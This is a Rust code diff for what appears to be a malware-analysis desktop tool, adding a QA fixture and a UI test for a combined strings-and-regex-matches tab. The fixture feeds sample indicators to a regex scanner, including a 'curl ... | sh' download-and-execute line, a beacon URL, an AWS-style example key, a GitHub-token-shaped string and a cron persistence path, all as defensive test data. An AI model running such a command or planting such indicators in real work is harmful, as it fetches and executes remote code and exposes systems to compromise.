@@ -999,7 +999,14 @@ fn native_analysis_workspace_fixture() {
             // its position in the strip.
             let directory =
                 std::env::var_os("ANTINOMIE_ANALYSIS_QA_DIR").map(std::path::PathBuf::from);
-            let (qa_report, qa_page) = qa_report();
+            let regex_view = view_name == "regex";
+            let (qa_report, qa_page) = if regex_view {
+                let report = with_listing(fixture(), AnalysisKind::Strings, 12);
+                let page = listing_page(&report, AnalysisKind::Strings).ok();
+                (report, page)
+            } else {
+                qa_report()
+            };
             let report = directory.as_ref().map_or_else(
                 || qa_report,
                 |directory| {
@@ -1036,6 +1043,28 @@ fn native_analysis_workspace_fixture() {
                     "strings" => Tab::Strings,
                     _ => Tab::FileInfo,
                 };
+            }
+            if regex_view {
+                state.tab = Tab::Strings;
+                crate::regex_matches::remember_data_dir(&std::env::temp_dir().join("ant-qa-regex"));
+                state.regex_asked = report.id.clone();
+                state.regex.open_for(
+                    &report.id,
+                    "fixture".into(),
+                    std::sync::Arc::new(|rules, _| {
+                        let mut scan = antinomie_monitor_core::strings_regex::Scan::default();
+                        for text in [
+                            "beacon to http://203.0.113.9/gate",
+                            "key AKIAIOSFODNN7EXAMPLE",
+                            "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
+                            "curl -s http://198.51.100.7/x | sh",
+                            "/etc/cron.d/persist",
+                        ] {
+                            rules.scan_text(text, &Default::default(), &mut scan);
+                        }
+                        Ok(scan)
+                    }),
+                );
             }
             state.active_view = Some("Structures/Sections".into());
             state.views.insert(
@@ -2262,4 +2291,87 @@ fn the_unpacking_tab_shows_the_chain_as_phases_and_opens_a_layers_analysis() {
     assert!(texts(&output)
         .iter()
         .any(|(text, _)| text.contains("was not part of this analysis")));
+}
+
+#[test]
+fn strings_and_regex_share_a_tab_with_the_matches_on_the_right() {
+    let ctx = egui::Context::default();
+    crate::theme::install(&ctx);
+    let report = with_listing(fixture(), AnalysisKind::Strings, 3);
+    let page = listing_page(&report, AnalysisKind::Strings);
+    let mut state = WorkspaceState::default();
+    state.bind(&report.id);
+    state.tab = Tab::Strings;
+    let pages = (None, Some(&page));
+    let at = |output: &egui::FullOutput, wanted: &str| {
+        texts(output)
+            .into_iter()
+            .find(|(text, _)| text == wanted)
+            .map(|(_, rect)| rect)
+    };
+    // The tab is named for both, and no separate button or window remains.
+    let (output, action) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(at(&output, "Strings & regex").is_some());
+    assert!(!texts(&output)
+        .iter()
+        .any(|(text, _)| text.contains("Regex matches…")));
+    // The first frame asks for the scan of this report, and only once.
+    assert!(action.is_none());
+    assert_eq!(state.take_regex_request().as_deref(), Some(&*report.id));
+    let (output, again) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(again.is_none() && state.take_regex_request().is_none());
+    // Wide: the pane is right of the strings.
+    let pane = at(&output, "Regex matches").expect("the pane's heading");
+    let strings = at(&output, "fixture string 0")
+        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&output)));
+    assert!(pane.left() > strings.right(), "{pane:?} {strings:?}");
+    // Narrow: it sits under them.
+    let mut narrow = None;
+    for _ in 0..4 {
+        narrow = Some(
+            frame(
+                &ctx,
+                &report,
+                &mut state,
+                None,
+                egui::vec2(700.0, 800.0),
+                Vec::new(),
+                pages,
+            )
+            .0,
+        );
+    }
+    let narrow = narrow.unwrap();
+    let pane = at(&narrow, "Regex matches").expect("the pane's heading");
+    let strings = at(&narrow, "fixture string 0")
+        .unwrap_or_else(|| panic!("a string row in {:?}", texts(&narrow)));
+    assert!(pane.top() > strings.bottom(), "{pane:?} {strings:?}");
+    // Other tabs have no pane.
+    state.tab = Tab::Floss;
+    let (floss, _) = frame(
+        &ctx,
+        &report,
+        &mut state,
+        None,
+        egui::vec2(1400.0, 800.0),
+        Vec::new(),
+        pages,
+    );
+    assert!(at(&floss, "Regex matches").is_none());
 }
